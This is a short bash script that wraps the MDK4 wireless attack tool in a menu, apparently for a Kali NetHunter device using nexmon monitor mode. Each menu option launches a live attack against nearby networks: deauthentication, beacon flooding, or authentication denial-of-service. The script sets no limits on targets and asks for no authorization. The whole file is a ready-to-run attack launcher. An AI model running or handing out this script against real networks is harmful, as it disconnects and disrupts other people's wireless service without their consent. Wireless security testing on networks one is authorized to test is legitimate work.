#!/bin/bash

########## FUNCTIONS ##########

banner(){
    clear
    printf "############################\n"
    printf "#           MDK4           #\n"
    printf "############################\n"
}

main_menu(){
    banner
    printf "1. wlan0 - internal wireless\n"
    printf "2. wlan1 - external wireless\n"
    printf "3. exit\n\n"
    read -p "Select interface: " iface_select
    case $iface_select in
        1) iface=" "; attack_menu;;
        2) iface="wlan1"; attack_menu;;
        3) exit;;
        *) printf "Wrong number! Try again..."; sleep 1; main_menu;;
    esac
}

attack_menu(){
    banner
    printf "1. Deauthentication\n"
    printf "2. Beacon Flood\n"
    printf "3. Denial Of Service\n"
    printf "4. back\n\n"
    read -p "Attack mode: " mode
    case $mode in
        1) f_deauth;;
        2) f_bcn;;
        3) f_dos;;
        4) main_menu;;
        *) printf "Wrong number! Try again..."; sleep 1; attack_menu;;
    esac
}

f_deauth(){
    
    trap ctrl_c INT

    function ctrl_c() {
        printf "\nCtrl-C by user\n"
        # do the jobs
    }
    
    banner
    read -p "Start attack? (Y/n): " question
    case $question in
        [yY][eE][sS]|[yY])
            if [ -z $iface ]; then banner; printf "Starting nexmon on wlan0...\n"; sleep 1; . monstart-nh; printf "Launching MDK4...\n"; sleep 1; mdk4 wlan0 d; printf "\nStopping nexmon on wlan0...\n"; sleep 1; . monstop-nh; else banner; printf "Launching MDK4...\n"; sleep 1; mdk4 wlan1 d; fi
            ;;
        [nN][oO]|[nN])
            exit
            ;;
        *) 
            printf "Wrong answer! Try again..."; sleep 1; f_deauth;;
    esac
}

f_bcn(){
    
    trap ctrl_c INT

    function ctrl_c() {
        printf "\nCtrl-C by user\n"
        # do the jobs
    }
    
    banner
    read -p "Start attack? (Y/n): " question
    case $question in
        [yY][eE][sS]|[yY])
            if [ -z $iface ]; then banner; printf "Starting nexmon on wlan0...\n"; sleep 1; . monstart-nh; printf "Launching MDK4...\n"; sleep 1; mdk4 wlan0 b -a; printf "\nStopping nexmon on wlan0...\n"; sleep 1; . monstop-nh; else banner; printf "Launching MDK4...\n"; sleep 1; mdk4 wlan1 b -a -s 150 ; fi
            ;;
        [nN][oO]|[nN])
            exit
            ;;
        *) 
            printf "Wrong answer! Try again..."; sleep 1; f_bcn;;
    esac
}


f_dos(){
    
    trap ctrl_c INT

    function ctrl_c() {
        printf "\nCtrl-C by user\n"
        # do the jobs
    }
    
    banner
    read -p "Start attack? (Y/n): " question
    case $question in
        [yY][eE][sS]|[yY])
            if [ -z $iface ]; then banner; printf "Starting nexmon on wlan0...\n"; sleep 1; . monstart-nh; printf "Launching MDK4...\n"; sleep 1; mdk4 wlan0 a; printf "\nStopping nexmon on wlan0...\n"; sleep 1; . monstop-nh; else banner; printf "Launching MDK4...\n"; sleep 1; mdk4 wlan1 a; fi
            ;;
        [nN][oO]|[nN])
            exit
            ;;
        *) 
            printf "Wrong answer! Try again..."; sleep 1; f_dos;;
    esac
}


########## START ##########

main_menu


